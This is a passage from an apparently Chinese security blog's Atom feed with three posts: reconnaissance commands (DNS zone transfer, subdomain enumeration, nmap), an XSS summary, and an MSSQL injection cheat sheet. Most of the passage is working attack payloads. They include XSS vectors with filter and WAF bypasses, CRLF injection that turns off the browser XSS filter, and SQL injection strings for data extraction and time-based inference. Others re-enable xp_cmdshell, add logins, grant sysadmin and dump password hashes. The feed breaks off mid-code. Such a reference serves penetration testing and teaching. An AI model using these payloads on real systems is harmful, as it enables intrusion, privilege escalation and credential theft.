      <category term="web" scheme="http://myt0.com/tags/web/"/>
    
      <category term="css" scheme="http://myt0.com/tags/css/"/>
    
  </entry>
  
  <entry>
    <title>信息搜集</title>
    <link href="http://myt0.com/2018/06/07/information-gathering/"/>
    <id>http://myt0.com/2018/06/07/information-gathering/</id>
    <published>2018-06-07T14:58:17.000Z</published>
    <updated>2018-08-20T06:07:17.304Z</updated>
    
    <content type="html"><![CDATA[<p>信息搜集通常要搜集以下几类信息：</p>
<ul>
<li>DNS 各类型解析信息</li>
<li>域名 WHOIS，备案情况</li>
<li>子域名列表</li>
<li>操作系统</li>
<li>端口及服务</li>
<li>社工信息（人员，邮箱，电话，历史泄露密码）</li>
<li>源码泄露.svn/.git 文件（github 及主要的公共仓库）</li>
<li>C 段</li>
</ul>
<h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查询指定解析类型</span></span><br><span class="line">dig domain ns</span><br><span class="line">nslookup -qt=ns domain</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询所有解析类型, +short显示精简结果</span></span><br><span class="line">dig domain any +short</span><br><span class="line"></span><br><span class="line"><span class="comment"># IP反查</span></span><br><span class="line">dig -x ip</span><br><span class="line"></span><br><span class="line"><span class="comment"># 域传送</span></span><br><span class="line">dig @dnsdomain axfr domain</span><br><span class="line"></span><br><span class="line"><span class="comment"># whois</span></span><br><span class="line">whois domain</span><br><span class="line">dmitry -w domain</span><br><span class="line"></span><br><span class="line"><span class="comment"># 子域名查询</span></span><br><span class="line"><span class="comment"># recon-ng</span></span><br><span class="line">use recon/domains-hosts/bing_domain_web</span><br><span class="line">use recon/domains-hosts/brute_hosts</span><br><span class="line"></span><br><span class="line"><span class="comment"># fierce会自动查询dns, zone transfer, subdomain(较慢)</span></span><br><span class="line">fierce -dns domain</span><br><span class="line"></span><br><span class="line"><span class="comment"># theharvester会通过搜索引擎搜集email, subdomain</span></span><br><span class="line">theharvester <span class="_">-d</span> domain <span class="_">-l</span> 50 -b baidu -h out.html</span><br><span class="line"></span><br><span class="line"><span class="comment"># 服务扫描</span></span><br><span class="line">nmap -A -T4 -F -Pn domain</span><br><span class="line"></span><br><span class="line"><span class="comment"># waf</span></span><br><span class="line">wafw00f domain</span><br><span class="line"></span><br><span class="line"><span class="comment"># http server指纹</span></span><br><span class="line">whatweb domain</span><br></pre></td></tr></table></figure>
<p>maltego 也可以进行更多搜索，且其图形化界面更为直观</p>
<h3 id="在线工具"><a href="#在线工具" class="headerlink" title="在线工具"></a>在线工具</h3><p><a href="https://network-tools.com/" target="_blank" rel="external">https://network-tools.com/</a></p>
<p><a href="https://dns.aizhan.com/" target="_blank" rel="external">https://dns.aizhan.com/</a></p>
<p><a href="http://i.links.cn/subdomain/" target="_blank" rel="external">http://i.links.cn/subdomain/</a></p>
<p><a href="https://pentest-tools.com/information-gathering/find-subdomains-of-domain" target="_blank" rel="external">https://pentest-tools.com/information-gathering/find-subdomains-of-domain</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;信息搜集通常要搜集以下几类信息：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;DNS 各类型解析信息&lt;/li&gt;
&lt;li&gt;域名 WHOIS，备案情况&lt;/li&gt;
&lt;li&gt;子域名列表&lt;/li&gt;
&lt;li&gt;操作系统&lt;/li&gt;
&lt;li&gt;端口及服务&lt;/li&gt;
&lt;li&gt;社工信息（人员，邮箱，电话，历史泄露密
    
    </summary>
    
    
      <category term="security" scheme="http://myt0.com/tags/security/"/>
    
      <category term="information gathering" scheme="http://myt0.com/tags/information-gathering/"/>
    
      <category term="dns" scheme="http://myt0.com/tags/dns/"/>
    
  </entry>
  
  <entry>
    <title>XSS总结</title>
    <link href="http://myt0.com/2017/08/14/xss%E6%80%BB%E7%BB%93/"/>
    <id>http://myt0.com/2017/08/14/xss总结/</id>
    <published>2017-08-14T13:45:37.000Z</published>
    <updated>2017-08-24T16:08:34.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="分类："><a href="#分类：" class="headerlink" title="分类："></a>分类：</h2><h3 id="反射型"><a href="#反射型" class="headerlink" title="反射型"></a>反射型</h3><p>payload在url之中，后台未进行有效处理将payload输出导致js代码执行。<br>js代码可能出现的位置：</p>
<ol>
<li><p>标签之间：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">- 标签之间可以直接执行的：</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span>[xss]<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">payload: <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert(1)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">- 有些标签之间不能执行，需要先闭合：</span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">textarea</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xmp</span>&gt;</span><span class="tag">&lt;/<span class="name">xmp</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">noscript</span>&gt;</span><span class="tag">&lt;/<span class="name">noscript</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">noframes</span>&gt;</span><span class="tag">&lt;/<span class="name">noframes</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">plaintext</span>&gt;</span><span class="tag">&lt;/<span class="name">plaintext</span>&gt;</span></span><br><span class="line">- 出现在<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>之间：</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">a=<span class="string">"[xss]"</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">payload:</span><br><span class="line">";alert(1)</span><br><span class="line">"<span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>alert(1)</span><br></pre></td></tr></table></figure>
</li>
<li><p>标签之内</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">- 文本属性：</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">value</span>=<span class="string">"[xss]"</span> /&gt;</span></span><br><span class="line">payload:</span><br><span class="line">" onmouseover=alert(1)</span><br><span class="line">"/&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert(1)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">- src/href/action/,img的（dynsrc/lowsrc）等属性：</span><br><span class="line">payload:</span><br><span class="line">javascript:alert(1)</span><br><span class="line">data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==  (IE不支持)</span><br><span class="line"></span><br><span class="line">- on*事件：</span><br><span class="line">payload:alert(1)</span><br><span class="line"></span><br><span class="line">- style属性内及css代码之中IE可执行，并且在IE9以上被防御，不适合其他浏览器：</span><br><span class="line">style="width:expression(js代码)"</span><br><span class="line">background-image:url('javascript:alert(2)')</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h3 id="存储型"><a href="#存储型" class="headerlink" title="存储型"></a>存储型</h3><p>经过处理请求，将XSS代码存储到数据库，然后输出到页面。这样导致xss攻击持久存在。通常通过表单提交，有一些服务也通过url提交，甚至有些存在于其他的HTTP头字段之中。<br>通常这种xss存在于个人信息，留言，文章日志等一些功能之中。<br>至于最终js代码存在的位置，我们依然可以根据上面判断。</p>
<h3 id="DOM-XSS"><a href="#DOM-XSS" class="headerlink" title="DOM XSS"></a>DOM XSS</h3><p>这种xss是由于前端代码直接将url中的代码输出到页面导致。不与后台进行交互。<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">例如页面存在：</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">eval</span>(location.hash.substr(<span class="number">1</span>))</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">payload:</span><br><span class="line">http://hostname/path#alert(1)</span><br></pre></td></tr></table></figure></p>
<p>常见的输入点：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.URL</span><br><span class="line"><span class="built_in">document</span>.URLUnencoded</span><br><span class="line"><span class="built_in">document</span>.location</span><br><span class="line"><span class="built_in">document</span>.referrer</span><br><span class="line"><span class="built_in">window</span>.location</span><br><span class="line"><span class="built_in">window</span>.name</span><br><span class="line"><span class="built_in">document</span>.cookie</span><br></pre></td></tr></table></figure></p>
<p>常见输出点：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">输出HTML：</span><br><span class="line"><span class="built_in">document</span>.write(x)</span><br><span class="line"><span class="built_in">document</span>.writeln(x)</span><br><span class="line"><span class="built_in">document</span>.body.innerHTML = x</span><br><span class="line"></span><br><span class="line">修改DOM树属性：</span><br><span class="line"><span class="built_in">document</span>.forms[<span class="number">0</span>].action = x (另外还有一些对象的src/href)</span><br><span class="line"><span class="built_in">document</span>.attachEvent(x)</span><br><span class="line"><span class="built_in">document</span>.create...(x)</span><br><span class="line"><span class="built_in">document</span>.execCommand(x)</span><br><span class="line"><span class="built_in">document</span>.body.x</span><br><span class="line"><span class="built_in">window</span>.attachEvent(x)</span><br><span class="line"></span><br><span class="line">修改URL：</span><br><span class="line"><span class="built_in">document</span>.location = x</span><br><span class="line"><span class="built_in">document</span>.location.hostname = x</span><br><span class="line"><span class="built_in">document</span>.location.replace(x)</span><br><span class="line"><span class="built_in">document</span>.location.assign(x)</span><br><span class="line"><span class="built_in">document</span>.URL = x</span><br><span class="line"><span class="built_in">window</span>.navigate(x)</span><br><span class="line"></span><br><span class="line">打开新窗口：</span><br><span class="line"><span class="built_in">document</span>.open(x)</span><br><span class="line"><span class="built_in">window</span>.open(x)</span><br><span class="line"><span class="built_in">window</span>.location.href = x</span><br><span class="line"></span><br><span class="line">直接执行的：</span><br><span class="line"><span class="built_in">eval</span>(x)</span><br><span class="line"><span class="built_in">window</span>.execScript(x)</span><br><span class="line"><span class="built_in">window</span>.setInterval(x)</span><br><span class="line"><span class="built_in">window</span>.setTimeout(x)</span><br></pre></td></tr></table></figure></p>
<h2 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">宽字节编码，同时开启magic_quotes_gpc=On，可通过以下payload绕过</span><br><span class="line">1.php?x=1%81&quot;;alert(1) //当charset=GBK/GB2312等编码</span><br><span class="line">magic_quotes_gpc=On:</span><br><span class="line">1.php?x=&lt;script %00%00%00&gt;alert(1)&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">空格绕过</span><br><span class="line">&lt;img/src=&quot;&quot;onerror=alert(2)&gt;</span><br><span class="line">&lt;svg/onload=alert(2)&gt;&lt;/svg&gt;</span><br><span class="line"></span><br><span class="line">大小写</span><br><span class="line">&lt;SCript&gt;alert(2)&lt;/SCript&gt;</span><br><span class="line"></span><br><span class="line">响应头CRLF关闭浏览器XSS Filter,</span><br><span class="line">头部注入X-XSS-Protection:0</span><br><span class="line">这种情况用于请求的URL链接在相应回来urldecode后导致换行，换行部分形成响应头：</span><br><span class="line">比如：</span><br><span class="line">http://x.com/xx.action?id=%0d%0aContent-Type:%20text/html%0d%0aX-XSS-Protection:%200%0d%0a%0d%0ax%3Cscript%3Ealert(1);%3C/script%3Ey</span><br><span class="line">经过urldecode后为：</span><br><span class="line">http://x.com/xx.action?id=</span><br><span class="line">Content-Type: text/html</span><br><span class="line">X-XSS-Protection: 0</span><br><span class="line"></span><br><span class="line">x&lt;script&gt;alert(1);&lt;/script&gt;y</span><br><span class="line"></span><br><span class="line">有些过滤器不检测注释，可用以下代码绕过：</span><br><span class="line">&lt;!--&lt;a href=&quot;--&gt;&lt;img src=x onerror=alert(2)//&quot;&gt;test&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">eval(String.fromCharCode())</span><br><span class="line"></span><br><span class="line">绕过URL过滤：</span><br><span class="line">URL编码</span><br><span class="line">十进制 http://</span><br><span class="line">十六进制 http://0x01.0x01.0x01.0x01</span><br><span class="line">八进制 http://01.01.01.01</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;分类：&quot;&gt;&lt;a href=&quot;#分类：&quot; class=&quot;headerlink&quot; title=&quot;分类：&quot;&gt;&lt;/a&gt;分类：&lt;/h2&gt;&lt;h3 id=&quot;反射型&quot;&gt;&lt;a href=&quot;#反射型&quot; class=&quot;headerlink&quot; title=&quot;反射型&quot;&gt;&lt;/a&gt;反射型&lt;/h
    
    </summary>
    
    
      <category term="security" scheme="http://myt0.com/tags/security/"/>
    
      <category term="xss" scheme="http://myt0.com/tags/xss/"/>
    
  </entry>
  
  <entry>
    <title>MSSQL注入总结</title>
    <link href="http://myt0.com/2017/08/10/sql-server-sqli/"/>
    <id>http://myt0.com/2017/08/10/sql-server-sqli/</id>
    <published>2017-08-10T15:00:00.000Z</published>
    <updated>2017-08-14T13:46:34.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="检测方法"><a href="#检测方法" class="headerlink" title="检测方法"></a>检测方法</h3><p>字符型需要先使用单引号闭合</p>
<ul>
<li>‘</li>
<li>and 1=1, and 1=2</li>
<li>WAITFOR DELAY ‘0：0：5’–</li>
<li>‘ and ‘1’=’1</li>
<li>‘ WAITFOR DELAY ‘0：0：5’–</li>
<li>–单行注释，/<em> </em>/为多行注释</li>
<li>可使用注释代替空格</li>
</ul>
<h3 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h3><p>报错型注入利用较为简单，可以直接爆出目标数据，比如：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">版本号：</span><br><span class="line">and 1=0/@@version; <span class="comment">--</span></span><br><span class="line">服务器名称：</span><br><span class="line">and 1=0/@@servername; <span class="comment">--</span></span><br><span class="line">当前使用语言：</span><br><span class="line">and 1=0/@@language; <span class="comment">--</span></span><br><span class="line">当前用户的进程ID：</span><br><span class="line">and 1=0/@@spid; <span class="comment">--</span></span><br><span class="line">用户名：</span><br><span class="line">and 1=0/@@user; <span class="comment">--</span></span><br><span class="line"><span class="keyword">select</span> user_name();</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">system_user</span>;</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">user</span>;</span><br><span class="line">枚举列名：</span><br><span class="line">having 1=1</span><br><span class="line">group by name having 1=1</span><br></pre></td></tr></table></figure></p>
<p>盲注可以通过占用页面上的显示位查询所需数据：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">union两侧的查询语句列数必须相同，且对应列数据类型应该相同或兼容</span><br><span class="line">union <span class="keyword">select</span> <span class="literal">null</span>,<span class="literal">null</span> 递增直到不出错即可得到列数</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="string">'test'</span>,<span class="number">2</span>,<span class="literal">null</span> 判断对应列的数据类型</span><br><span class="line">强制类型转换：</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">cast</span>(<span class="string">'333'</span> <span class="keyword">AS</span> <span class="built_in">varchar</span>)</span><br><span class="line">使用<span class="keyword">union</span>检索数据时，可以使用<span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span>先屏蔽系统的正常数据</span><br><span class="line">获取当前数据库表／列信息：</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">name</span> <span class="keyword">from</span> sysobjects <span class="keyword">WHERE</span> xtype = <span class="string">'U'</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">name</span> <span class="keyword">from</span> syscolumns <span class="keyword">WHERE</span> <span class="keyword">id</span> =(<span class="keyword">select</span> <span class="keyword">id</span> <span class="keyword">from</span> sysobjects <span class="keyword">WHERE</span> <span class="keyword">name</span> = <span class="string">'tablenameforcolumnnames'</span>)</span><br><span class="line">检索数据库列表：</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">name</span>,<span class="literal">null</span> <span class="keyword">from</span> master..sysdatabases</span><br><span class="line"><span class="keyword">select</span> DB_NAME(N);</span><br><span class="line">检索目标数据库(此处以dbname代替)的表名：</span><br><span class="line">union <span class="keyword">select</span> <span class="keyword">name</span>,<span class="literal">null</span> <span class="keyword">from</span> dbname..sysobjects <span class="keyword">where</span> xtype=<span class="string">'U'</span><span class="comment">--</span></span><br><span class="line">枚举列名：</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">name</span> <span class="keyword">from</span> dbname..syscolumns <span class="keyword">where</span> <span class="keyword">id</span>=(<span class="keyword">select</span> <span class="keyword">id</span> <span class="keyword">from</span> dbname..sysobjects <span class="keyword">where</span> <span class="keyword">name</span>=<span class="string">'dbtable'</span>)</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> a.name <span class="keyword">from</span> dbname..syscolumns a,dbname..sysobjects b <span class="keyword">where</span> b.name=<span class="string">'dbtable'</span> <span class="keyword">and</span> a.id=b.id<span class="comment">--</span></span><br><span class="line">查询数据：</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="literal">null</span>,column1,column2 <span class="keyword">from</span> dbname..tablename<span class="comment">--</span></span><br><span class="line">错误信息：</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> master..sysmessages</span><br></pre></td></tr></table></figure></p>
<p>而当页面不能显示所需数据时，可以采用延迟时间来推测，sql server基于时间的注入主要是利用waitfor delay制造延迟，并配合条件语句来逐步推出目标数据，例如：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">判断权限：</span><br><span class="line">if (system_user='sa') waitfor delay '0：0：5' <span class="comment">--</span></span><br><span class="line"></span><br><span class="line">检测version返回第25个字符是否等于5：</span><br><span class="line">if (substring((<span class="keyword">select</span> @@<span class="keyword">version</span>),<span class="number">25</span>,<span class="number">1</span>)) = <span class="number">5</span>) waitfor delay <span class="string">'0：0：5'</span> <span class="comment">--</span></span><br></pre></td></tr></table></figure></p>
<h3 id="数据库不同权限的利用方式"><a href="#数据库不同权限的利用方式" class="headerlink" title="数据库不同权限的利用方式"></a>数据库不同权限的利用方式</h3><p>权限判断：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">db_owner判断：</span><br><span class="line">' and 1=(<span class="keyword">select</span> is_member(<span class="string">'db_owner'</span>)) <span class="keyword">and</span> <span class="string">'1'</span>!&gt;<span class="string">'3</span><br><span class="line">sa判断：</span><br><span class="line">select IS_SRVROLEMEMBER('</span>sysadmin<span class="string">')</span></span><br></pre></td></tr></table></figure></p>
<ul>
<li>如果是sa权限可以尝试存储过程直接提权，public则尽量获取数据库信息找后台突破</li>
</ul>
<p>存储过程：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">exec master..xp_cmdshell 'dir'</span><br><span class="line">exec master.dbo.xp_cmdshell 'cmd.exe dir c：'</span><br><span class="line">exec xp_regread HKEY_LOCAL_MACHINE, 'SYSTEM\CurrentControlSet\Services\lanmanserver\parameters', 'nullsessionshares'</span><br><span class="line">exec xp_regenumvalues HKEY_LOCAL_MACHINE, 'SYSTEM\CurrentControlSet\Services\snmp\parameters\validcommunities'</span><br><span class="line">xp_regaddmultistring</span><br><span class="line">xp_regdeletekey</span><br><span class="line">xp_regdeletevalue</span><br><span class="line">xp_regenumkeys</span><br><span class="line">xp_regenumvalues</span><br><span class="line">xp_regread</span><br><span class="line">xp_regremovemultistring</span><br><span class="line">xp_regwrite</span><br><span class="line">xp_servicecontrol</span><br><span class="line">xp_availablemedia</span><br><span class="line">xp_enumdsn</span><br><span class="line">xp_loginconfig</span><br><span class="line">xp_makecab</span><br><span class="line">xp_ntsec_enumdomains</span><br><span class="line">xp_terminate_process</span><br><span class="line">重新启动xp_cmdshell：</span><br><span class="line">master..sp_configure '<span class="keyword">show</span> <span class="keyword">advanced</span> options<span class="string">',1</span><br><span class="line">reconfigure</span><br><span class="line">master..sp_configure '</span>xp_cmdshell<span class="string">',1</span><br><span class="line">reconfigure</span></span><br></pre></td></tr></table></figure></p>
<p>用户操作：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">增加用户：</span><br><span class="line">exec sp_addlogin 'user', 'pass';</span><br><span class="line">删除用户：</span><br><span class="line">exec sp_droplogin 'user';</span><br><span class="line">查询用户：</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">name</span> <span class="keyword">from</span> master..syslogins</span><br><span class="line">#MSSQL <span class="number">2000</span>：</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">name</span>, <span class="keyword">password</span> <span class="keyword">from</span> master..sysxlogins</span><br><span class="line">#MSSQL <span class="number">2005</span>：</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">name</span>, password_hash <span class="keyword">from</span> master.sys.sql_logins</span><br><span class="line">赋予管理员角色：</span><br><span class="line">exec master.dbo.sp_addsrvrolemember <span class="string">'user'</span>, <span class="string">'sysadmin;</span></span><br></pre></td></tr></table></figure></p>
<h3 id="一些WAF绕过方式"><a href="#一些WAF绕过方式" class="headerlink" title="一些WAF绕过方式"></a>一些WAF绕过方式</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">代替空格：</span><br><span class="line">id=1+union+<span class="keyword">select</span>+<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="comment">/*</span><br><span class="line">%0b代替：</span><br><span class="line">id=1+uni%0bon+se%0blect+1,2,3--</span><br><span class="line">%09 %0A %0B %0C %0D %A0都可代替空格</span><br><span class="line">注释混淆：</span><br><span class="line">id=1/*union*/</span><span class="keyword">union</span><span class="comment">/*select*/</span><span class="keyword">select</span>+<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="comment">/*</span><br><span class="line">id=1+un/**/</span>ion+sel<span class="comment">/**/</span>ect+<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="comment">--</span></span><br><span class="line"><span class="keyword">id</span>=<span class="number">1</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/*&amp;id=*/</span><span class="keyword">select</span><span class="comment">/*&amp;id=*/</span>pwd<span class="comment">/*&amp;id=*/</span><span class="keyword">from</span><span class="comment">/*&amp;id=*/</span><span class="keyword">users</span></span><br><span class="line"><span class="keyword">id</span>=<span class="number">1</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/*,*/</span><span class="keyword">select</span><span class="comment">/*,*/</span>pwd<span class="comment">/*,*/</span><span class="keyword">from</span><span class="comment">/*,*/</span><span class="keyword">users</span></span><br><span class="line"><span class="keyword">id</span>=<span class="number">1</span> <span class="comment">/*!union*/</span> <span class="comment">/*!select*/</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="comment">--（mysql）</span></span><br><span class="line">大小写混淆：</span><br><span class="line"><span class="keyword">id</span>=<span class="number">1</span>+<span class="keyword">UnIoN</span><span class="comment">/**/</span><span class="keyword">SeLecT</span><span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="comment">--</span></span><br><span class="line"><span class="keyword">id</span>=<span class="number">1</span>+<span class="keyword">OR</span>+<span class="number">0x50</span>=<span class="number">0x50</span></span><br><span class="line">针对<span class="keyword">replace</span>过滤关键词的：</span><br><span class="line"><span class="keyword">id</span>=<span class="number">1</span>+UNunionION+SEselectLECT+<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="comment">--</span></span><br><span 